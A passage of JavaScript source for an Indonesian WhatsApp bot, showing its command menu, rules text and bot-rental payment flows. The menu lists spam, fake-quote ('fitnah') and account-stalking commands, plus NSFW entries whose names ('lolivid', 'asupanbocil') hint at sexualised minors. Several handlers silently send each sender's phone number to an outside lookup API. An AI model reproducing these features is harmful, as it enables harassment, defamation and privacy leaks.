│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│_/\_ ${prefix}tiktokmusic
│_/\_ ${prefix}ytsearch
│_/\_ ${prefix}play
│_/\_ ${prefix}ytmp3
│_/\_ ${prefix}ytmp4
│_/\_ ${prefix}igdl
│_/\_ ${prefix}fbdl
│_/\_ ${prefix}brainly
│_/\_ ${prefix}lirik
│_/\_ ${prefix}tiktoknowm
│_/\_ ${prefix}pinterest
│_/\_ ${prefix}spotifysearch
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│
│  𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kbbi
│_/\_ ${prefix}jarak
│_/\_ ${prefix}translate
│_/\_ ${prefix}infogempa
│_/\_ ${prefix}covidindo
│_/\_ ${prefix}covidglobal
│_/\_ ${prefix}wikipedia
│_/\_ ${prefix}playstore
│_/\_ ${prefix}kodepos
│_/\_ ${prefix}newsinfo
│_/\_ ${prefix}jadwaltv
│_/\_ ${prefix}cuaca
│_/\_ ${prefix}gimage
│_/\_ ${prefix}wallpapersearch
│_/\_ ${prefix}shopee
│_/\_ ${prefix}google
│
│ 𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}owner
│_/\_ ${prefix}sewabot
│_/\_ ${prefix}report
│_/\_ ${prefix}runtime
│_/\_ ${prefix}speed 
│_/\_ ${prefix}sc
│_/\_ ${prefix}rulesbot
│_/\_ ${prefix}sharelock
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│  𝐆𝐚𝐛𝐮𝐭 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}suit
│_/\_ ${prefix}artinama
│_/\_ ${prefix}jodoh
│_/\_ ${prefix}tebakumur
│_/\_ ${prefix}weton
│_/\_ ${prefix}jadian
│_/\_ ${prefix}faktaunik
│_/\_ ${prefix}anime
│_/\_ ${prefix}truth
│_/\_ ${prefix}dare
│_/\_ ${prefix}dadu
│_/\_ ${prefix}tebakgambar
│_/\_ ${prefix}tembak udara 
│_/\_ ${prefix}tembak laut
│_/\_ ${prefix}tembak darat
│_/\_ ${prefix}slot
│_/\_ ${prefix}quotes
│_/\_ ${prefix}quotesanime
│_/\_ ${prefix}quotesdilan
│_/\_ ${prefix}quotesimage
│_/\_ ${prefix}katabijak
│_/\_ ${prefix}randomnama
│_/\_ ${prefix}meme
│_/\_ ${prefix}darkjoke
│_/\_ ${prefix}memeindo
│
│  ⬣ 𝙈𝘼𝙆𝙄𝙉𝙂 𝙁𝙀𝘼𝙏𝙐𝙍𝙀𝙎
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}emoji
│_/\_ ${prefix}golden text
│_/\_ ${prefix}flower text
│_/\_ ${prefix}wooden text
│_/\_ ${prefix}burn text
│_/\_ ${prefix}glow text
│_/\_ ${prefix}summer text
│_/\_ ${prefix}neon text
│_/\_ ${prefix}coffeecup text
│_/\_ ${prefix}coffeecup2 text
│_/\_ ${prefix}battlefield text|text
│_/\_ ${prefix}googletxt2 text|text
│_/\_ ${prefix}transformer text|text
│_/\_ ${prefix}write text
│_/\_ ${prefix}waifu
│_/\_ ${prefix}phlogo text|*text
│_/\_ ${prefix}tfire text
│_/\_ ${prefix}phcomment text|text
│_/\_ ${prefix}wolf text
│_/\_ ${prefix}ytgol text
│_/\_ ${prefix}ytsilver text
│_/\_ ${prefix}t3d text
│_/\_ ${prefix}logoa text|text
│_/\_ ${prefix}marvel text|text
│_/\_ ${prefix}leavest text
│_/\_ ${prefix}neon2 text
│_/\_ ${prefix}wall text
│_/\_ ${prefix}notewrite text
│_/\_ ${prefix}pubglogo text|text
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙁𝙐𝙉 
│_/\_ ${prefix}fitnah
│_/\_ ${prefix}fitnahpc
│_/\_ ${prefix}kontak 0|p
│_/\_ ${prefix}lolivid
│_/\_ ${prefix}suit
│_/\_ ${prefix}toxic
│_/\_ ${prefix}flock
│_/\_ ${prefix}pantun
│_/\_ ${prefix}dadu
│_/\_ ${prefix}asupan
│_/\_ ${prefix}viewonce
│_/\_ ${prefix}detikvn number
│_/\_ ${prefix}detikvideo number
│_/\_ ${prefix}hbd
│
│  𝐒𝐭𝐚𝐥𝐤 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}igstalk
│_/\_ ${prefix}mlstalk
│_/\_ ${prefix}tkstalk
│_/\_ ${prefix}githubstalk
│_/\_ ${prefix}shortlink
│
│  𝐀𝐬𝐮𝐩𝐚𝐧 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}asupan
│_/\_ ${prefix}asupancecan
│_/\_ ${prefix}asupanhijaber
│_/\_ ${prefix}asupansantuy
│_/\_ ${prefix}asupanukhti
│_/\_ ${prefix}asupanbocil
│_/\_ ${prefix}asupanghea
│_/\_ ${prefix}asupanrika
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙉𝙎𝙁𝙒 
│_/\_ ${prefix}yuri
│_/\_ ${prefix}hentai
│_/\_ ${prefix}anal
│_/\_ ${prefix}eroneko
│_/\_ ${prefix}lesbian
│_/\_ ${prefix}kitsune
│_/\_ ${prefix}bj
│_/\_ ${prefix}pussy
│_/\_ ${prefix}wallpaper
│_/\_ ${prefix}neko2
│_/\_ ${prefix}baka
│_/\_ ${prefix}slap
│_/\_ ${prefix}poke
│_/\_ ${prefix}keta
│_/\_ ${prefix}awoo
│_/\_ ${prefix}blowjob
│_/\_ ${prefix}megumin
│_/\_ ${prefix}neko
│_/\_ ${prefix}trapnime
│
│  𝐖𝐢𝐛𝐮 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kurumi
│_/\_ ${prefix}deku
│_/\_ ${prefix}sao
│_/\_ ${prefix}chika
│_/\_ ${prefix}kaneki
│_/\_ ${prefix}touka
│_/\_ ${prefix}eren
│_/\_ ${prefix}naruto
│_/\_ ${prefix}minato
│_/\_ ${prefix}sagiri
│_/\_ ${prefix}sasuke
│_/\_ ${prefix}sakura
│_/\_ ${prefix}tsunade
│_/\_ ${prefix}gojosatoru
└──────────[`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakesem}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break				
case 'syarat':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `*RULES BOT*

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan mengejek bot.
Sanksi: *PERMANENT BLOCK*

3. Gpp sc gw jelek yg penting 
Bot gw jalan awokawoak
Jika sudah dipahami rules-nya, silakan ketik *allmenu* untuk memulai!

*Jika ada fitur yang gal work harap hubungi owner*

Owner  BOT:
wa.me/62858157008612`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'report':
let pesan = body.slice(8)
if (pesan.length > 300) return pras.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, { quoted: ftrol })
var nomor = zer.participant
let teks1 = `[𝗥𝗘𝗣𝗢𝗥𝗧]\n𝐏𝐞𝐬𝐚𝐧 : ${pesan}`
var options = {
text: teks1,
contextInfo: { mentionedJid: [nomor] },
}
ALIYABOT.sendMessage(`62858157008613@s.whatsapp.net`, options, text, { quoted: ftrol })
reply('Masalah Telah Di Laporkan Ke Owner BOT, Mohon Tunggu Untuk Proses Perbaikan')
break
case 'wangy':
  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})  
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
              case 'bucin':
                    case 'quotebucin':
                      if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})    
                    hasil = bucinrandom[Math.floor(Math.random() * (bucinrandom.length))]
                    ALIYABOT.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
            break
              case 'wiki':
					anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/wiki?kata=${q}&apikey=IkyOgiwara`)
					ALIYABOT.sendMessage(from, `「 RESULT FOUND 」\n• Hasil Pencarian Dari: ${anu.result.from}\n• Hasil: ${anu.hasil}`, text, {quoted: mek})
					break
              case "cekme":
  case "cakme":    
  reply("Tunggu!, Sedang Scan Number & Name")
					// ⚠️ Case By Arasya
					neme = args.join(" ")
					bet = `${sender}`
					const sifat =['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
					const hoby =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const bukcin =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const arp =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const cakep =['Iyaa cakep','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget😍','❌','✔️']
					const wetak=['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const baikk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bhuruk =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const cerdhas =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const berhani =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const mengheikan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const sipat = sifat[Math.floor(Math.random() * sifat.length)]
					const biho = hoby[Math.floor(Math.random() * hoby.length)]
					const bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					const senga = arp[Math.floor(Math.random() * arp.length)]
					const chakep = cakep[Math.floor(Math.random() * cakep.length)]
					const watak = wetak[Math.floor(Math.random() * wetak.length)]
					const baik = baikk[Math.floor(Math.random() * baikk.length)]
					const burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					const cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					const berani = berhani[Math.floor(Math.random() * berhani.length)]
					const takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					try {
					profil = await ALIYABOT.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
					} catch {
					profil = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
					}
					 profile = `${c}==== CEK @${bet.split('@')[0]} ====${c}

*Nama :* ${pushname}
*Sifat :* ${sipat}
*Hobby :* ${biho}
*Bucin :* ${bhucin}%
*Sange :* ${senga}%
*Cakep :* ${chakep}
*Watak :* ${watak}
*Akhlak Baik :* ${baik}%
*Akhlak Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Ketakutan :* ${takut}%
${c}=================${c}`
					buff = await getBuffer(profil)
					ALIYABOT.sendMessage(from, buff, image, {quoted: mek, caption: profile, contextInfo: { mentionedJid: [bet]}})
					break
case 'gtau':
              gopeynya = 'https://telegra.ph/file/0939ef6401dc76df07e90.jpg'
            buff = await getBuffer(gopeynya)
            teksnya = `
*RULES BOT*

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan mengejek bot.
Sanksi: *PERMANENT BLOCK*

3. Gpp sc gw jelek yg penting 
Bot gw jalan awokawoak
Jika sudah dipahami rules-nya, silakan ketik *allmenu* untuk memulai!

*Jika ada fitur yang gal work harap hubungi owner*

Owner  BOT:
wa.me/62858157008612
`
  buttons = [{buttonId: `${prefix}owner`,buttonText:{displayText: `OWNER BOT`},type:1},{buttonId: `${prefix}menu`,buttonText:{displayText: `KEMBALI KE MENU`},type:1}]
              imageMsg = (await ALIYABOT.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'closed in your informations︎ ', imageMessage: imageMsg,
              contentText: teksnya,buttons,headerType:4}
              prep = await ALIYABOT.prepareMessageFromContent(from,{buttonsMessage},{quoted:mek})
                                          ALIYABOT.relayWAMessage(prep)
      break
      case 'donasi':
      case 'donasibot':
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *Donasi om buat beli jajan ]*
│_/\_ Via Ovo : Wa.me//62858157008612 Wa.me//6285815700861
│_/\_ Via Dana : Wa.me//6285816588689 Wa.me//62858157090
│_/\_ Via Pulsa :Wa.me//6285815700875 Wa.me//6285815709876
└──────[ DONASI ]─────[`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakegim}, [{buttonId:`${prefix}infoall`,buttonText:{displayText:'LIST MEMBERS'},type:1},{buttonId:`${prefix}listadmin`,buttonText:{displayText:'LIST ADMIN'},type:1},{buttonId:`${prefix}infogrup`,buttonText:{displayText:'INFO GROUP'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
///=====PEMBATAS SEWA =========
case 'sewabot':
case 'sewa':
        case '0':
        if (isBanned) return reply(mess.ban)
        stod = `${sender}`
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			
       menu = `0`
sendButLocation(from, `*_Hai ${pushname} 👋🏻_* \n\nyakin nih mau sewa bot ? 🤔 Boong auto banned >_<`, "*©Sewa Bot 2021*", {jpegThumbnail:fakeimage}, [{buttonId:`${prefix}sewa1`,buttonText:{displayText:'🗿Ya'},type:1},{buttonId:`${prefix}gk`,buttonText:{displayText:'👀Tidak'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break
case 'sewa1':
 listMsg = {
 buttonText: 'KLIK DISINI',
 footerText: '*Sewa Bot © 2021*',
 description: `*LIST SEWA BOT*\n _Hay @${stod.split('@')[0]}_ Ini adalah list sewa bot silahkan pilih`,
 sections: [
                     {
                      "title": `${sender}`,
 rows: [
                          {
                              "title": "🕐sewa 1 minggu",
                              "rowId": ""
                           },
                           {                                                      
                              "title": "🕑sewa 2 minggu",
                              "rowId": ""
                           },
                           {
                              "title": "🕒sewa 3 minggu",
                              "rowId": ""
                           },
                           {
                              "title": "🕓sewa 1 bulan",
                              "rowId": ""
                           },
                           {
                              "title": "🕔sewa 2 bulan",
                              "rowId": ""
                           },
                           {
                              "title": "👨‍💻",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ALIYABOT.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:mek})
break
case '🕐sewa':
case '🕑sewa':
case '🕒sewa':
case '🕓sewa':
case '🕔sewa':
        case '0':
        stod = `${sender}`
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			
       menu = `0`
sendButLocation(from, `_*Hai ${pushname}🌹*_\n\nSilahkan pilih metode pembayaran`, "*Sewa Bot © 2021*", {jpegThumbnail:fakeimage}, [{buttonId:`${prefix}py`,buttonText:{displayText:'NOMOR 📱'},type:1},{buttonId:`${prefix}qrsewa`,buttonText:{displayText:'QR CODE 📱'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break
case 'py':
        case '0':
        stod = `${sender}`
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			
       menu = `0`
sendButLocation(from, `_*Hai ${pushname}🌹*_\n\nSilahkan pilih metode pembayaran`, "*Sewa Bot © 2021*", {jpegThumbnail:fakeimage}, [{buttonId:`${prefix}o1`,buttonText:{displayText:'OVO 📱'},type:1},{buttonId:`${prefix}d1`,buttonText:{displayText:'GOPAY 📱'},type:1},{buttonId:`${prefix}d1`,buttonText:{displayText:'DANA 📱'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break
case 'qrsewa':
        case '0':
        stod = `${sender}`
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			
       menu = `0`
sendButLocation(from, `_Hai ${pushname}🌹_\n\nSilahkan pilih metode pembayaran`, "*Sewa Bot © 2021*", {jpegThumbnail:fakeimage}, [{buttonId:`${prefix}qrg1`,buttonText:{displayText:'QR GOPAY 📱'},type:1},{buttonId:`${prefix}qro1`,buttonText:{displayText:'QR OVO 📱'},type:1},{buttonId:`${prefix}qrd1`,buttonText:{displayText:'QR DANA 📱'},type:1}], {contextInfo: { mentionedJid: [stod]}})
break
case 'qro1':
ALIYABOT.sendMessage(from, `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/62858157008612_

*════〘 BOT 〙════*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "QRCODE OVO",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/alya.jpg'),sourceUrl:"OV1876"}}})
break
case 'qrg1':
ALIYABOT.sendMessage(from, `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/62858157008612_

*════〘 BOT 〙════*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "QRCODE GOPAY",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/alya.jpg'),sourceUrl:"GPY18ui876"}}})
break
case 'qrg1':
ALIYABOT.sendMessage(from, `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/62858157008612_

*════〘 BOT 〙════*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "QRCODE DANA",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/alya.jpg'),sourceUrl:"DNA187736"}}})
break
case 'o1':
menu = `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/62858157008612_

*════〘 BOT 〙════*`
katalog(menu)
listMsg = {
 buttonText: 'NOMOR',
 footerText: '*Sewa Bot © 2021*',
 description: `*Hai ${pushname} 🎟️* \n\nsilahkan tekan "NOMOR" untuk melihat nomer ovo dan jangan lupa sertakan bukti pembayaran dan kirim ke OWNER`,
 sections: [
                     {
                      "title": `OVO : 0${Noovo}`,
 rows: [
                           {
                              "title": "👍 \n\nOk Bang",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ALIYABOT.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break
case 'd1':
menu = `*[❗] OPEN SEWA BOT*
╭───────────────
│ *Harga Sewa MINGGUAN*
│ 1 minggu : Rp 3.000 
│ 2 minggu : Rp 5.000
│ 3 minggu : Rp 10.000
╰────────────────
          │ *Harga Sewa BULANAN*
          │1 Bulan : Rp. 15.000
          │2 Bulan : Rp. 20.000
          ╰───────────────
╭───────────────
│ *NOTE :*
│BOT AKTIF 24 JAM
╰────────────────

*📌 MINAT?*
_CHAT : wa.me/62858157008612_

*════〘 BOT 〙════*`
katalog(menu)
listMsg = {
 buttonText: 'NOMOR',
 footerText: '*Sewa Bot © 2021*',
 description: `*Hai ${pushname} 🎟️* \n\nsilahkan tekan "NOMOR" untuk melihat nomer dana dan jangan lupa sertakan bukti pembayaran dan kirim ke OWNER`,
 sections: [
                     {
                      "title": `DANA : 0${Nodana}`,
 rows: [
                           {
                              "title": "👍 \n\nOk Bang",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ALIYABOT.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:mek})
break
case 'g1':
